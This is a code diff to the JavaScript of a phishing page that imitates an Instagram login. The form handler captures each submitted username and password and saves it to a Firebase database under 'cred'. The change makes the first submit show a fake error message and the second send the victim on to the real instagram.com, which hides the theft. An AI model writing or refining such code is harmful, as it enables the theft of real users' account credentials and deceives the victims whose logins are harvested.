@@ -26,20 +26,28 @@ const firebaseConfig = {
 };
 
 firebase.initializeApp(firebaseConfig);
-
-
 var credDB = firebase.database().ref("cred");
 
 document.getElementById('cred').addEventListener('submit',submitForm)
+let loginButtonClickCount = 0;
 
-function submitForm(e){
+function submitForm(e) {
     e.preventDefault();
     var username = getElementVal("username");
     var password = getElementVal("password");
-    console.log(username,password);
+    console.log(username, password);
     saveMessages(username,password);
+    if (loginButtonClickCount === 0) {
+        document.getElementById('errorMessage').style.display = 'block';
+        loginButtonClickCount++;
+    } else {
+        redirectToAnotherURL();
+    }
 }
-
+function redirectToAnotherURL() {
+    // Modify this function to redirect to your desired URL
+    window.location.href = 'https://www.instagram.com/';
+}
 const saveMessages = (username, password) => {
   var newCred = credDB.push();
 
@@ -51,12 +59,4 @@ const saveMessages = (username, password) => {
 
 const getElementVal = (id) =>{
     return document.getElementById(id).value;
-}
-
-
-
-document.getElementById('Log In').addEventListener('click', redirectToWebsite);
-
-function redirectToWebsite() {
-    window.location.href = 'https://www.instagram.com/';
 }
